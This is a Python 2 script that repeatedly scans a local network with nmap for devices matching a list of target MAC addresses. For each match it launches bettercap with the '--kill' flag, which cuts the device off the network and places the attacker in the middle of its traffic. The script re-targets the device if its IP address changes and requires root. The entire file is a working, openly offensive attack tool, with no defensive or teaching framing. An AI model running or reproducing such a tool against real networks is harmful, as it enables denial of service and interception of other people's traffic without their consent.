#!/usr/bin/sudo python
import os
import subprocess
import sys
import threading
import time

import nmap
from multiprocessing import Process

network = 'XXX.XXX.XXX.2/24'
target_mac = ['']
polling_network_interval = 10  # seconds


class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


class MiTmThread(threading.Thread):
	def __init__(self, ip, id):
		threading.Thread.__init__(self)
		self.nm = nmap.PortScanner()
		self.name = 'MiTmThread'
		self.ip = ip
		self.id = id
		self.p = None

	def run(self):
		print bcolors.OKGREEN + "[+] " + self.name + ": Starting on " + self.id + " !"+ bcolors.ENDC

		# bettercap --kill -T <target_ip>
		self.p = subprocess.Popen(['bettercap', '--kill', '-T' + self.ip])

	def stop(self):
		print bcolors.OKBLUE + "[+] " + self.name + " on " + self.id + " exiting!" + bcolors.ENDC
		if self.p is not None:
			print bcolors.OKBLUE + "[+] " + self.name + " on " + self.id + " subprocess successfully terminated!" + bcolors.ENDC
			subprocess.Popen.kill(self.p)





class NetworkScanThread(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.nm = nmap.PortScanner()
		self.name = 'NetworkScanThread'
		self.macMitmIstanceAssoc = {}
		self.macIpAssoc = {}

	def Mitm(self, ip, id):
		p = None
		name = 'MitM Process'
		print bcolors.OKGREEN + "[+] " + name + ": Starting on " + id + " !" + bcolors.ENDC

		# bettercap --kill -T <target_ip>
		p = subprocess.Popen(['bettercap', '--kill', '-T' + ip])

	def run(self):
		print bcolors.OKBLUE + "[+] " + self.name + ": Starting" + bcolors.ENDC
		while True:
			print bcolors.OKBLUE + "[+] " + self.name + ": Scanning network" + bcolors.ENDC
			self.nm.scan(hosts=network, arguments='-snP')

			host_list = self.nm.all_hosts()
			for host in host_list:
				if 'mac' in self.nm[host]['addresses']:
					print bcolors.OKBLUE + "[+] " + self.name + ": detected " + host + ' : ' + self.nm[host]['addresses']['mac'] + bcolors.ENDC

					if self.nm[host]['addresses']['mac'] in target_mac:
						targetmac = self.nm[host]['addresses']['mac']
						print bcolors.OKGREEN + "[+] " + self.name + ': Target Found ' + targetmac + ' !' + bcolors.ENDC

						# mac not already mitm'd
						if not targetmac in self.macIpAssoc:
							self.macIpAssoc[targetmac] = host

							mitmTh = Process(target=self.Mitm, args=(host,targetmac)).start()
							self.macMitmIstanceAssoc[targetmac] = mitmTh
						# mac already mitm'd, check if host changed
						else:
							if self.macIpAssoc[targetmac] != host:
								self.macMitmIstanceAssoc[targetmac].terminate()

								self.macIpAssoc[targetmac] = host
								mitmTh = Process(target=self.Mitm, args=(host,targetmac)).start()
								self.macMitmIstanceAssoc[targetmac] = mitmTh

			# check if target is offline: in this case, close its mitm thread
			# changed = True
			# while changed:
			# 	changed = False
			# 	for macMitmd in self.macIpAssoc:
			# 		if self.macIpAssoc[macMitmd] not in host_list:
			# 			print bcolors.WARNING + "[+] " + self.name + ": device " + self.macIpAssoc[macMitmd] + " appears offline" + bcolors.ENDC
			# 			self.macMitmIstanceAssoc[macMitmd].stop()
			# 			self.macIpAssoc.pop(macMitmd)
			# 			self.macMitmIstanceAssoc.pop(macMitmd)
			# 			changed = True
			# 			break

			time.sleep(polling_network_interval)

	def stop(self):
		if self.macMitmIstanceAssoc:
			print bcolors.OKBLUE + "[+] " + self.name + ": terminating MitM instances.." + bcolors.ENDC
			for instance in self.macMitmIstanceAssoc:
				if(self.macMitmIstanceAssoc[instance]):
					self.macMitmIstanceAssoc[instance].terminate()


if __name__ == '__main__':
	networkScanTh = None
	try:
		if os.geteuid() != 0:
			print bcolors.FAIL + "[-] Root permissions required. Aborting.." + bcolors.ENDC
			sys.exit(1)

		print bcolors.OKBLUE + "[+] Checking if bettercap is installed.." + bcolors.ENDC
		subprocess.call(["which", "bettercap"])

		networkScanTh = NetworkScanThread()
		networkScanTh.run()
	except KeyboardInterrupt:
		print bcolors.OKBLUE + "[+] Keyboard interrupt caught" + bcolors.ENDC
		if networkScanTh:
			networkScanTh.stop()
	except OSError as osexc:
		if osexc.errno == os.errno.ENOENT:
			# handle file not found error.
			print bcolors.FAIL + "[-] Bettercap seems to not be installed" + bcolors.ENDC
		else:
			# Something else went wrong while trying to run `bettercap`
			print bcolors.FAIL + "[-] " + osexc.message + bcolors.ENDC
		sys.exit(2)
	except Exception as genericex:
		print bcolors.FAIL + "[-] " + genericex.message + bcolors.ENDC
		sys.exit(5)
